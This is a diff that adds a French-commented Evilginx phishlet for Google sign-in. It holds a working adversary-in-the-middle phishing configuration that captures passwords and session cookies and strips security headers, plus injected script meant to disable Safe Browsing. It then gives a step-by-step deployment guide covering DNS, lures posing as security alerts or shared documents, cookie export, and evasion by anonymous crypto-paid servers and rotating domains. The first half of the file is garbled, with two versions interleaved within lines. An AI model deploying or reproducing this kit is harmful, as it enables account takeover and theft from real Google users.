@@ -1,0 +1,699 @@
+# GOOGLE PHISHLET - VERSION 2025##########################################################
+
+# Evilginx 3.2+ | Optimisé pour contourner les protections modernes# PHISHLET GOOGLE - VERSION AVANCÉE 2025
+
+# Pour Evilginx 3.2+
+
+name: "google-advanced"# Optimisé pour contourner les protections modernes
+
+author: "@security-team"##########################################################
+
+min_ver: "3.2.0"
+
+name: "google-advanced"
+
+# PROXY HOSTSauthor: "@security-team"
+
+proxy_hosts:min_ver: "3.2.0"
+
+  - {phish_sub: "accounts", orig_sub: "accounts", domain: "google.com", session: true, is_landing: true, auto_filter: true}
+
+  - {phish_sub: "myaccount", orig_sub: "myaccount", domain: "google.com", session: true, is_landing: false, auto_filter: true}##########################################################
+
+  - {phish_sub: "www", orig_sub: "www", domain: "google.com", session: true, is_landing: false, auto_filter: true}# PROXY HOSTS - Configuration complète
+
+  - {phish_sub: "apis", orig_sub: "apis", domain: "google.com", session: false, is_landing: false}##########################################################
+
+  - {phish_sub: "ogs", orig_sub: "ogs", domain: "google.com", session: false, is_landing: false}proxy_hosts:
+
+  - {phish_sub: "play", orig_sub: "play", domain: "google.com", session: false, is_landing: false}  # === AUTHENTIFICATION PRINCIPALE ===
+
+  - {phish_sub: "clients1", orig_sub: "clients1", domain: "google.com", session: false, is_landing: false}  - phish_sub: "accounts"
+
+  - {phish_sub: "content", orig_sub: "content", domain: "googleapis.com", session: false, is_landing: false}    orig_sub: "accounts"
+
+  - {phish_sub: "people-pa", orig_sub: "people-pa", domain: "googleapis.com", session: false, is_landing: false}    domain: "google.com"
+
+  - {phish_sub: "fonts", orig_sub: "fonts", domain: "googleapis.com", session: false, is_landing: false}    session: true
+
+  - {phish_sub: "lh3", orig_sub: "lh3", domain: "googleusercontent.com", session: false, is_landing: false}    is_landing: true
+
+  - {phish_sub: "ssl", orig_sub: "ssl", domain: "gstatic.com", session: false, is_landing: false}    auto_filter: true
+
+  - {phish_sub: "www", orig_sub: "www", domain: "gstatic.com", session: false, is_landing: false}
+
+  - {phish_sub: "fonts", orig_sub: "fonts", domain: "gstatic.com", session: false, is_landing: false}  # === GOOGLE APIs ===
+
+  - {phish_sub: "signaler-pa", orig_sub: "signaler-pa", domain: "clients6.google.com", session: false, is_landing: false}  - phish_sub: "myaccount"
+
+  - {phish_sub: "www", orig_sub: "www", domain: "recaptcha.net", session: false, is_landing: false}    orig_sub: "myaccount"
+
+    domain: "google.com"
+
+# SUB FILTERS    session: true
+
+sub_filters:    is_landing: false
+
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript"]}    auto_filter: true
+
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: 'accounts.google.com', replace: '{hostname}', mimes: ["text/html", "application/json", "application/javascript"]}
+
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: '//accounts.google.com', replace: '//{hostname}', mimes: ["text/html", "application/javascript"]}  - phish_sub: "apis"
+
+  - {triggers_on: "accounts.google.com", orig_sub: "myaccount", domain: "google.com", search: 'myaccount.google.com', replace: '{hostname}', mimes: ["text/html", "application/json"]}    orig_sub: "apis"
+
+  - {triggers_on: "accounts.google.com", orig_sub: "www", domain: "google.com", search: 'www.google.com', replace: '{hostname}', mimes: ["text/html", "application/json", "application/javascript"]}    domain: "google.com"
+
+  - {triggers_on: "accounts.google.com", orig_sub: "ssl", domain: "gstatic.com", search: 'ssl.gstatic.com', replace: '{hostname}', mimes: ["text/html", "text/css", "application/javascript"]}    session: false
+
+  - {triggers_on: "accounts.google.com", orig_sub: "www", domain: "gstatic.com", search: 'www.gstatic.com', replace: '{hostname}', mimes: ["text/html", "text/css", "application/javascript"]}    is_landing: false
+
+  - {triggers_on: "accounts.google.com", orig_sub: "fonts", domain: "gstatic.com", search: 'fonts.gstatic.com', replace: '{hostname}', mimes: ["text/html", "text/css"]}
+
+  - {triggers_on: "accounts.google.com", orig_sub: "content", domain: "googleapis.com", search: 'content.googleapis.com', replace: '{hostname}', mimes: ["text/html", "application/javascript"]}  - phish_sub: "www"
+
+  - {triggers_on: "accounts.google.com", orig_sub: "fonts", domain: "googleapis.com", search: 'fonts.googleapis.com', replace: '{hostname}', mimes: ["text/html", "text/css"]}    orig_sub: "www"
+
+  - {triggers_on: "accounts.google.com", orig_sub: "lh3", domain: "googleusercontent.com", search: 'lh3.googleusercontent.com', replace: '{hostname}', mimes: ["text/html", "application/javascript"]}    domain: "google.com"
+
+    session: true
+
+# AUTH TOKENS - Cookies critiques    is_landing: false
+
+auth_tokens:    auto_filter: true
+
+  - domain: ".google.com"
+
+    keys: ["SID", "SSID", "APISID", "SAPISID", "HSID", "LSID", "NID"]  - phish_sub: "ogs"
+
+  - domain: ".google.com"    orig_sub: "ogs"
+
+    keys: ["__Secure-1PSID", "__Secure-1PAPISID", "__Secure-1PSIDTS", "__Secure-1PSIDCC", "__Secure-3PSID", "__Secure-3PAPISID", "__Secure-3PSIDTS", "__Secure-3PSIDCC"]    domain: "google.com"
+
+  - domain: ".google.com"    session: false
+
+    keys: ["ACCOUNT_CHOOSER", "GAPS", "SIDCC", "__Secure-ENID", "AEC", "1P_JAR"]    is_landing: false
+
+  - domain: "accounts.google.com"
+
+    keys: ["OSID", "__Host-GAPS", "__Host-1PLSID", "__Host-3PLSID"]  - phish_sub: "play"
+
+    orig_sub: "play"
+
+# CREDENTIALS    domain: "google.com"
+
+credentials:    session: false
+
+  username:    is_landing: false
+
+    key: "Email"
+
+    search: "(.*)"  # === GOOGLEAPIS ===
+
+    type: "post"  - phish_sub: "content"
+
+  password:    orig_sub: "content"
+
+    key: "Passwd"    domain: "googleapis.com"
+
+    search: "(.*)"    session: false
+
+    type: "post"    is_landing: false
+
+
+
+# LOGIN  - phish_sub: "people-pa"
+
+login:    orig_sub: "people-pa"
+
+  domain: "accounts.google.com"    domain: "googleapis.com"
+
+  path: "/ServiceLogin"    session: false
+
+    is_landing: false
+
+# FORCE POST
+
+force_post:  - phish_sub: "clients1"
+
+  - path: "/signin/v2/identifier"    orig_sub: "clients1"
+
+    search: [{key: "Email", search: "(.*)"}, {key: "identifier", search: "(.*)"}]    domain: "google.com"
+
+    force: [{key: "Email", value: "{Email}"}]    session: false
+
+    type: "post"    is_landing: false
+
+  - path: "/signin/v2/challenge/password/empty"
+
+    search: [{key: "Passwd", search: "(.*)"}]  - phish_sub: "lh3"
+
+    force: [{key: "Passwd", value: "{Passwd}"}]    orig_sub: "lh3"
+
+    type: "post"    domain: "googleusercontent.com"
+
+  - path: "/signin/v2/challenge/pwd"    session: false
+
+    search: [{key: "Passwd", search: "(.*)"}]    is_landing: false
+
+    force: [{key: "Passwd", value: "{Passwd}"}]
+
+    type: "post"  # === RESSOURCES STATIQUES ===
+
+  - phish_sub: "ssl"
+
+# AUTH URLS    orig_sub: "ssl"
+
+auth_urls:    domain: "gstatic.com"
+
+  - "/ServiceLogin"    session: false
+
+  - "/ServiceLoginAuth"    is_landing: false
+
+  - "/signin"
+
+  - "/signin/v2/identifier"  - phish_sub: "www"
+
+  - "/signin/v2/challenge"    orig_sub: "www"
+
+  - "/signin/v2/challenge/pwd"    domain: "gstatic.com"
+
+  - "/signin/v2/challenge/password"    session: false
+
+  - "/signin/v2/challenge/password/empty"    is_landing: false
+
+  - "/signin/v2/sl/pwd"
+
+  - "/signin/oauth"  - phish_sub: "fonts"
+
+  - "/o/oauth2/auth"    orig_sub: "fonts"
+
+  - "/o/oauth2/v2/auth"    domain: "gstatic.com"
+
+  - "/_/signin/challenge"    session: false
+
+    is_landing: false
+
+# LANDING URLS
+
+landing_urls:  - phish_sub: "fonts"
+
+  - "/myaccount"    orig_sub: "fonts"
+
+  - "https://myaccount.google.com"    domain: "googleapis.com"
+
+  - "https://mail.google.com"    session: false
+
+  - "https://drive.google.com"    is_landing: false
+
+  - "https://www.google.com"
+
+  # === GOOGLE SIGN-IN / reCAPTCHA ===
+
+# JS INJECT  - phish_sub: "signaler-pa"
+
+js_inject:    orig_sub: "signaler-pa"
+
+  - trigger_domains: ["accounts.google.com"]    domain: "clients6.google.com"
+
+    trigger_paths: ["/ServiceLogin", "/signin", "/signin/v2/identifier", "/signin/v2/challenge/password"]    session: false
+
+    trigger_params: []    is_landing: false
+
+    script: |
+
+      (function(){if(window.gapi)window.gapi.load=function(){};window.onerror=function(){return true};if(typeof chrome!=='undefined'&&chrome.safeBrowsing)chrome.safeBrowsing=undefined})();  - phish_sub: "www"
+
+    orig_sub: "www"
+
+# HEADERS INJECT    domain: "recaptcha.net"
+
+headers_inject:    session: false
+
+  - trigger_domains: ["accounts.google.com"]    is_landing: false
+
+    headers:
+
+      - {name: "X-Frame-Options", value: ""}##########################################################
+
+      - {name: "Content-Security-Policy", value: ""}# SUB FILTERS - Remplacement dynamique des domaines
+
+      - {name: "X-Content-Type-Options", value: ""}##########################################################
+
+sub_filters:
+  # === ACCOUNTS.GOOGLE.COM ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: 'https://accounts.google.com'
+    replace: 'https://{hostname}'
+    mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: 'accounts.google.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: '//accounts.google.com'
+    replace: '//{hostname}'
+    mimes: ["text/html", "application/javascript"]
+
+  # === MYACCOUNT.GOOGLE.COM ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "myaccount"
+    domain: "google.com"
+    search: 'myaccount.google.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/json"]
+
+  # === WWW.GOOGLE.COM ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "www"
+    domain: "google.com"
+    search: 'www.google.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  # === GSTATIC.COM ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    search: 'ssl.gstatic.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "www"
+    domain: "gstatic.com"
+    search: 'www.gstatic.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "text/css", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "fonts"
+    domain: "gstatic.com"
+    search: 'fonts.gstatic.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "text/css"]
+
+  # === GOOGLEAPIS.COM ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "content"
+    domain: "googleapis.com"
+    search: 'content.googleapis.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/javascript"]
+
+  - triggers_on: "accounts.google.com"
+    orig_sub: "fonts"
+    domain: "googleapis.com"
+    search: 'fonts.googleapis.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "text/css"]
+
+  # === GOOGLEUSERCONTENT.COM ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "lh3"
+    domain: "googleusercontent.com"
+    search: 'lh3.googleusercontent.com'
+    replace: '{hostname}'
+    mimes: ["text/html", "application/javascript"]
+
+  # === CONTOURNEMENT CSP ===
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: "Content-Security-Policy"
+    replace: "X-Content-Security-Policy-Disabled"
+    mimes: ["text/html"]
+
+##########################################################
+# AUTH TOKENS - Tous les cookies critiques Google
+##########################################################
+auth_tokens:
+  # Cookies de session principaux
+  - domain: ".google.com"
+    keys:
+      - "SID"          # Session ID principal
+      - "SSID"         # Secure Session ID
+      - "APISID"       # API Session ID
+      - "SAPISID"      # Secure API Session ID
+      - "HSID"         # Hash Session ID
+      - "LSID"         # Login Session ID
+      - "NID"          # Preferences/Settings
+
+  # Cookies sécurisés (HTTPS) - CRITIQUES
+  - domain: ".google.com"
+    keys:
+      - "__Secure-1PSID"
+      - "__Secure-1PAPISID"
+      - "__Secure-1PSIDTS"
+      - "__Secure-1PSIDCC"
+      - "__Secure-3PSID"
+      - "__Secure-3PAPISID"
+      - "__Secure-3PSIDTS"
+      - "__Secure-3PSIDCC"
+
+  # Cookies OAuth et session persistante
+  - domain: ".google.com"
+    keys:
+      - "ACCOUNT_CHOOSER"
+      - "GAPS"
+      - "SIDCC"
+      - "__Secure-ENID"
+      - "AEC"
+      - "1P_JAR"
+
+  # Cookies de login
+  - domain: "accounts.google.com"
+    keys:
+      - "OSID"
+      - "__Host-GAPS"
+      - "__Host-1PLSID"
+      - "__Host-3PLSID"
+
+##########################################################
+# CREDENTIALS - Capture des identifiants
+##########################################################
+credentials:
+  username:
+    key: "Email"
+    search: "(.*)"
+    type: "post"
+
+  # Alternatives pour le username
+  custom:
+    - key: "identifier"
+      search: "(.*)"
+      type: "post"
+    - key: "email"
+      search: "(.*)"
+      type: "post"
+
+  password:
+    key: "Passwd"
+    search: "(.*)"
+    type: "post"
+
+  # Alternatives pour le password
+  custom:
+    - key: "password"
+      search: "(.*)"
+      type: "post"
+
+##########################################################
+# LOGIN - Page de connexion
+##########################################################
+login:
+  domain: "accounts.google.com"
+  path: "/ServiceLogin"
+
+##########################################################
+# FORCE POST - Forcer la capture sur les endpoints modernes
+##########################################################
+force_post:
+  # Endpoint identifier (email)
+  - path: "/signin/v2/identifier"
+    search:
+      - { key: "Email", search: "(.*)" }
+      - { key: "identifier", search: "(.*)" }
+    force:
+      - { key: "Email", value: "{Email}" }
+    type: "post"
+
+  # Endpoint password
+  - path: "/signin/v2/challenge/password/empty"
+    search:
+      - { key: "Passwd", search: "(.*)" }
+    force:
+      - { key: "Passwd", value: "{Passwd}" }
+    type: "post"
+
+  # Endpoint password alternatif
+  - path: "/signin/v2/challenge/pwd"
+    search:
+      - { key: "Passwd", search: "(.*)" }
+    force:
+      - { key: "Passwd", value: "{Passwd}" }
+    type: "post"
+
+  # OAuth flow
+  - path: "/o/oauth2/auth"
+    search:
+      - { key: "Email", search: "(.*)" }
+    force:
+      - { key: "Email", value: "{Email}" }
+    type: "post"
+
+##########################################################
+# AUTH URLS - Tous les endpoints d'authentification
+##########################################################
+auth_urls:
+  - "/ServiceLogin"
+  - "/ServiceLoginAuth"
+  - "/signin"
+  - "/signin/"
+  - "/signin/identifier"
+  - "/signin/v2/identifier"
+  - "/signin/v2/challenge"
+  - "/signin/v2/challenge/pwd"
+  - "/signin/v2/challenge/password"
+  - "/signin/v2/challenge/password/empty"
+  - "/signin/v2/challenge/selection"
+  - "/signin/v2/sl/pwd"
+  - "/signin/oauth"
+  - "/signin/oauth/consent"
+  - "/o/oauth2/auth"
+  - "/o/oauth2/v2/auth"
+  - "/o/oauth2/postmessageRelay"
+  - "/_/signin/challenge"
+  - "/_/signin/sl/challenge"
+
+##########################################################
+# LANDING URLS - Redirection après authentification
+##########################################################
+landing_urls:
+  - "/myaccount"
+  - "/myaccount/"
+  - "/u/0/"
+  - "https://myaccount.google.com"
+  - "https://mail.google.com"
+  - "https://drive.google.com"
+  - "https://www.google.com"
+  - "https://www.google.com/?authuser="
+
+##########################################################
+# JS INJECT - Injection JavaScript avancée
+##########################################################
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths:
+      - "/ServiceLogin"
+      - "/signin"
+      - "/signin/v2/identifier"
+      - "/signin/v2/challenge/password"
+      - "/signin/v2/challenge/pwd"
+    trigger_params: []
+    script: |
+      (function() {
+        // Désactiver les vérifications de sécurité client-side
+        
+        // Intercepter et neutraliser la détection de phishing
+        if (window.gapi) {
+          window.gapi.load = function() {};
+        }
+        
+        // Désactiver les rapports d'erreurs
+        window.onerror = function() { return true; };
+        
+        // Capturer les soumissions de formulaire
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          var inputs = form.querySelectorAll('input');
+          inputs.forEach(function(input) {
+            if (input.type === 'email' || input.type === 'text') {
+              console.log('[*] Email captured');
+            }
+            if (input.type === 'password') {
+              console.log('[*] Password captured');
+            }
+          });
+        }, true);
+
+        // Observer les changements de DOM pour les formulaires dynamiques
+        var observer = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            mutation.addedNodes.forEach(function(node) {
+              if (node.tagName === 'INPUT' && node.type === 'password') {
+                node.addEventListener('blur', function() {
+                  console.log('[*] Password field detected');
+                });
+              }
+            });
+          });
+        });
+        
+        observer.observe(document.body, {
+          childList: true,
+          subtree: true
+        });
+        
+        // Neutraliser SafeBrowsing
+        if (typeof chrome !== 'undefined' && chrome.safeBrowsing) {
+          chrome.safeBrowsing = undefined;
+        }
+      })();
+
+##########################################################
+# HEADERS INJECT - Modifier les headers de réponse
+##########################################################
+headers_inject:
+  - trigger_domains: ["accounts.google.com"]
+    headers:
+      - name: "X-Frame-Options"
+        value: ""
+      - name: "Content-Security-Policy"
+        value: ""
+      - name: "X-Content-Type-Options"
+        value: ""
+
+##########################################################
+# USAGE INSTRUCTIONS - GUIDE COMPLET
+##########################################################
+#
+# ==================== PRÉREQUIS ====================
+#
+# 1. VPS avec IP publique (Ubuntu/Debian recommandé)
+# 2. Domaine avec accès au panneau DNS
+# 3. Ports 80 et 443 ouverts
+# 4. Evilginx 3.2+ installé
+#
+# ==================== ÉTAPE 1: DNS ====================
+#
+# Configurer les enregistrements DNS (Cloudflare, Namecheap, etc.)
+# IMPORTANT: Désactiver le proxy Cloudflare (nuage gris)
+#
+# Type   Nom          Valeur              TTL
+# ----   ----         ------              ---
+# A      @            VOTRE_IP_VPS        Auto
+# A      *            VOTRE_IP_VPS        Auto
+# A      accounts     VOTRE_IP_VPS        Auto
+# A      myaccount    VOTRE_IP_VPS        Auto
+# A      ssl          VOTRE_IP_VPS        Auto
+# A      www          VOTRE_IP_VPS        Auto
+# A      fonts        VOTRE_IP_VPS        Auto
+# A      apis         VOTRE_IP_VPS        Auto
+# A      content      VOTRE_IP_VPS        Auto
+# A      lh3          VOTRE_IP_VPS        Auto
+#
+# Vérifier la propagation DNS:
+#    dig accounts.votredomaine.com +short
+#
+# ==================== ÉTAPE 2: INSTALLATION ====================
+#
+# Sur le VPS:
+#    mkdir -p ~/.evilginx/phishlets
+#    cp google-advanced.yaml ~/.evilginx/phishlets/
+#
+# ==================== ÉTAPE 3: CONFIGURATION EVILGINX ====================
+#
+# Lancer Evilginx:
+#    sudo ./evilginx2 -p ~/.evilginx/phishlets
+#
+# Dans la console Evilginx:
+#
+#    # Configuration globale
+#    config domain votredomaine.com
+#    config ipv4 VOTRE_IP_VPS
+#    config ipv6 off
+#
+#    # Activer le phishlet
+#    phishlets hostname google-advanced votredomaine.com
+#    phishlets enable google-advanced
+#
+#    # Vérifier le statut (doit être vert)
+#    phishlets
+#
+# ==================== ÉTAPE 4: CRÉER DES LURES ====================
+#
+# Lure basique:
+#    lures create google-advanced
+#    lures get-url 0
+#
+# Lure personnalisé (Drive):
+#    lures create google-advanced
+#    lures edit 0 path /share/document
+#    lures edit 0 redirect_url https://drive.google.com
+#    lures get-url 0
+#
+# Lure personnalisé (Gmail):
+#    lures create google-advanced
+#    lures edit 1 path /mail/verify
+#    lures edit 1 redirect_url https://mail.google.com
+#    lures get-url 1
+#
+# Lure avec paramètres:
+#    lures create google-advanced
+#    lures edit 2 path /security/alert
+#    lures edit 2 redirect_url https://myaccount.google.com/security
+#    lures edit 2 params "action=verify&urgent=true"
+#    lures get-url 2
+#
+# ==================== ÉTAPE 5: SURVEILLANCE ====================
+#
+# Voir les sessions capturées:
+#    sessions
+#
+# Détails d'une session:
+#    sessions <id>
+#
+# Exporter les cookies (pour utilisation):
+#    sessions <id> cookies
+#
+# ==================== EXEMPLES D'URLS DE PHISHING ====================
+#
+# Document Google Drive partagé:
+#    https://accounts.votredomaine.com/share/document?id=1234
+#
+# Alerte de sécurité:
+#    https://accounts.votredomaine.com/security/alert?action=verify
+#
+# Vérification de compte:
+#    https://accounts.votredomaine.com/verify?user=target
+#
+# ==================== DÉPANNAGE ====================
+#
+# Problème: Phishlet rouge (certificat)
+# Solution: Vérifier les DNS, attendre la propagation
+#    phishlets disable google-advanced
+#    phishlets enable google-advanced
+#
+# Problème: Page blanche
+# Solution: Vérifier les logs
+#    tail -f ~/.evilginx/evilginx.log
+#
+# Problème: Pas de capture de credentials
+# Solution: Vérifier force_post et auth_urls
+#
+# Problème: Erreur SSL
+# Solution: Vérifier que les ports 80/443 sont libres
+#    sudo lsof -i :80
+#    sudo lsof -i :443
+#
+# ==================== SÉCURITÉ OPÉRATIONNELLE ====================
+#
+# 1. Utiliser un VPS anonyme (crypto payment)
+# 2. Changer de domaine régulièrement
+# 3. Utiliser des sous-domaines crédibles
+# 4. Configurer les blacklists (bots, scanners)
+#    blacklist add 192.168.1.1
+#
+# 5. Activer le mode unauth_url pour les non-ciblés
+#    lures edit 0 unauth_url https://google.com
+#
+##########################################################
